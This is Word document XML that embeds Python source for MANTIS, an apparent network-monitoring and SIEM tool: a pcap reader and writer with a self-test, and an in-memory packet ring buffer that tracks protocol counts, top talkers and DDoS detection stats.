      </w:r>
    </w:p>
    <w:p w14:paraId="5311775D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="601D0F7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Handles both byte orders and both microsecond and nanosecond magics, so</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55E80D0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captures produced by tcpdump on any host are accepted.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="424948A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1074C021" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="69FB71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__init__(self, path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E4AA29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self.path = path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="404B52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self._fh = open(path, "rb")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="249FE08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head = self._fh.read(24)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="247595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len(head) &lt; 24:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DF43B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self._fh.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D9C1AC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raise PcapError("%s: truncated global header" % path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58BB5C37" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="26CD9E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magic = struct.unpack("&lt;I", head[:4])[0]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="394ED28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if magic == MAGIC_MICRO:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FEF95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self.endian, self.nano = "&lt;", False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4547577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elif magic == MAGIC_NANO:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CF470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self.endian, self.nano = "&lt;", True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="289109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elif struct.unpack("&gt;I", head[:4])[0] == MAGIC_MICRO:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F32FF3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self.endian, self.nano = "&gt;", False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42754B0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elif struct.unpack("&gt;I", head[:4])[0] == MAGIC_NANO:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28CC1CE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self.endian, self.nano = "&gt;", True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="397E20E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else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36C0832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self._fh.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12751F9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raise PcapError("%s: not a pcap file (magic=0x%08x)" % (path, magic))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="324A3103" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6347004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(_, self.version_major, self.version_minor, self.thiszone,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35E37D5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self.sigfigs, self.snaplen, self.linktype) = struct.unpack(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="734D28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self.endian + _GLOBAL_HEADER, head)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="720987E6" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="72AF83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__iter__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52661C2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divisor = 1_000_000_000.0 if self.nano else 1_000_000.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3252EF6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while True:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32B6A66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head = self._fh.read(16)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="241A4D1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len(head) &lt; 16:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="200BD0A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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="005189F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ts_sec, ts_frac, incl_len, orig_len = struct.unpack(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="532597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self.endian + _RECORD_HEADER, head)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64247A4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data = self._fh.read(incl_len)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6673C61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len(data) &lt; incl_len:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02843B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 truncated final record</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25FCA4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yield (ts_sec + ts_frac / divisor, data, orig_len)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68511003" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08E03F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close(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DE16D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self._fh and not self._fh.closed:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C2597E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self._fh.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="794098B5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E2F4F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__enter__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3800B2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self</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DD661CB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="74726D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__exit__(self, *exc):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64E96A1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self.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6998D50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False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2731E02A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3F716494" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C2C59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build_from_records(records, snaplen=65535):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C80FD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"""Build a complete .pcap byte string from MANTIS packet-store records.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B9B652B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6384C8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Each record is the dict held in the in-memory ring buffer: a hex-encoded</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="781985A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frame snapshot plus the original on-wire length. This is what the SIEM</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0628E4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serves from /api/export.pcap so the analyst can open the live buffer in</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69E07E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Wireshark.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64563FC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BDA43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 = [global_header(snaplen)]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F6465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item in records:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2990E51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hex_data = item.get("hex") or ""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36B09FE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30F456B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raw = bytes.fromhex(hex_data)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28B04C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ValueError:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E6096D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continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A8651E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out.append(record(raw,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DFFCD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ts=item.get("ts"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="597E5A0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orig_len=item.get("length", len(raw)),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F502E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snaplen=snaplen))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2217EFE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b"".join(out)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B5A7E35" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="29A86736" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3C8C3FA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__name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B73F7D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round-trip self-check</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AF7AFB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frame = bytes.fromhex("ffffffffffff001122334455080045000014")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B1D241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path = "selftest.pcap"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57FEAF6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PcapWriter(path, snaplen=96) as w:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="609B87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w.write(frame, ts=1700000000.123456, orig_len=1514)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="499C349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PcapReader(path) as r:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="089952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print("linktype=%d snaplen=%d" % (r.linktype, r.snaplen))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D0E328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ts, data, orig in r:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24B5FB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print("ts=%.6f incl=%d orig=%d match=%s"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="747A707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(ts, len(data), orig, data == frame))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18395B1A"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src/utils/packet_store.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B68AE36" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>142 lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29F04F8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#!/usr/bin/env python3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0328602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"""In-memory packet history for MANTIS.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EFCF3FC" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0928D92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Acts like a tiny local "database" that lives entirely in RAM: a fixed-size</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F1F660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ring buffer of the most recently captured packets. This lets the web</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="729A624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dashboard show real captured traffic (source/destination, protocol, flags,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27BA07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length and a raw hex dump) that the analyst can scroll through and inspect,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26C6553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instead of the mock packets used before.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21C0DEA0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F2975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Zero dependencies - standard library only, consistent with the rest of</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7486926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MANTIS. Thread-safe because the sensor writes from the analyzer thread while</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69AC059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the SIEM web server reads from HTTP handler threads.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="075F28E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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68B1F957" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0EB7785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threading</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F9167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time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="784F5DC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from collections import deque</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17CE7C35" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="677FC51C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2BB9A46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PacketStore:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BE5E0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__init__(self, maxlen=5000):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CF3FE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ring buffer: when full, the oldest packet is dropped automatically</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0773A8B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self._packets = deque(maxlen=maxlen)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B1CFCA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self._lock = threading.Lock()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="221664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self._seq = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="501B1CE7" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B30BAE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live traffic stats (updated once per second by the sensor)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="577F533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self.pps = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AA72A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self.mean = 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A12CD0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self.z_score = 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E5103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self.ddos_candidate = False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54F0C9B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self.ddos_active = False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="347695EB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="446233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cumulative counters for the whole session</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0660D0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self.proto_counts = {"TCP": 0, "UDP": 0, "ICMP": 0, "OTHER": 0}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B3D494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self.talkers = {}          # src ip -&gt; packet count</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09320A4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self.total_seen = 0        # total packets ever recorded (not capped)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FC22B6D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3708CD5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add(self, record):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67B952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"""Store one captured packet. `record` is a small dict of metadata."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B971E7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self._lock:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F7810B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self._seq += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C27499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self.total_seen += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A3F671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record["no"] = self._seq</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D62EED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self._packets.append(record)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57728ABF" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6041A1F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proto = record.get("proto", "OTHER")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50EF86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self.proto_counts[proto] = self.proto_counts.get(proto, 0) + 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FF87993" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A5CC5F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 = record.get("src")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6424164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src:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5776C74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self.talkers[src] = self.talkers.get(src, 0) + 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02C7DED1" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="48BB9A3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update_stats(self, pps, mean, z_score, ddos_candidate=False,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60191D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ddos_active=False):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E9589C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self.pps = pps</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09D3C6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self.mean = mean</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C7203B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self.z_score = z_score</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D059C0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self.ddos_candidate = bool(ddos_candidate)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B3FD83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self.ddos_active = bool(ddos_active)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B5692BF" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="634857E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get_recent(self, limit=200, proto=None, query=None, after=0):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6961A4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the newest packets first, with optional filtering.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61F0529C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B9E068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proto  - keep only this protocol (TCP/UDP/ICMP/OTHER)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="586D83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query  - case-insensitive substring match on src, dst, info, verdict</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C64F9C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after  - only return packets with a sequence number greater than this</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48CF1F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CFD69A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self._lock:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30CC44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items = list(self._packets)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2771971A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4BBE864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after:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="673236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items = [p for p in items if p["no"] &gt; after]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C6A246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proto and proto != "ALL":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F02A0E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proto = proto.upper()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02E303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items = [p for p in items if p.get("proto") == proto]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A149E9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query:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="641400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q = query.lower()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E5618E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items = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="780730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 for p in items</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46E0BBE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q in str(p.get("src", "")).lower()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3695175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or q in str(p.get("dst", "")).lower()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10ACFB3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or q in str(p.get("info", "")).lower()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="572F011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or q in str(p.get("verdict", "")).lower()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4149B67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3E97DF2" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6F9185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items.reverse()  # newest first</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CC60D7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items[:limit]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14FF76E9" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2781729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all_packets(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C16735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self._lock:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74545C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list(self._packets)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="635E1674" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B90453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top_talkers(self, n=5):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58BC507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self._lock:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B676D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pairs = sorted(self.talkers.items(), key=lambda kv: kv[1],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59E273E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reverse=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F85D2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[{"ip": ip, "count": c} for ip, c in pairs[:n]]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BFB2A58" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5D9438E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stats_snapshot(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A58B67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self._lock:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="585CA8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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75CA7B8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"pps": self.pps,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73F27A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"mean": round(self.mean, 2),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="385A4B4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"z_score": round(self.z_score, 2),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B0758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"ddos_candidate": self.ddos_candidate,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63DA57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"ddos_active": self.ddos_active,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A5C9EC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"buffered": len(self._packets),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E44E04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"total_seen": self.total_seen,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="135C30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"capacity": self._packets.maxlen,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52B3CC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"proto_counts": dict(self.proto_counts),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56C4041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8DD2A90" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="17B6B2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clear(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56DB56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self._lock:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="379167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self._packets.clear()</w:t>
      </w:r>
    </w:p>
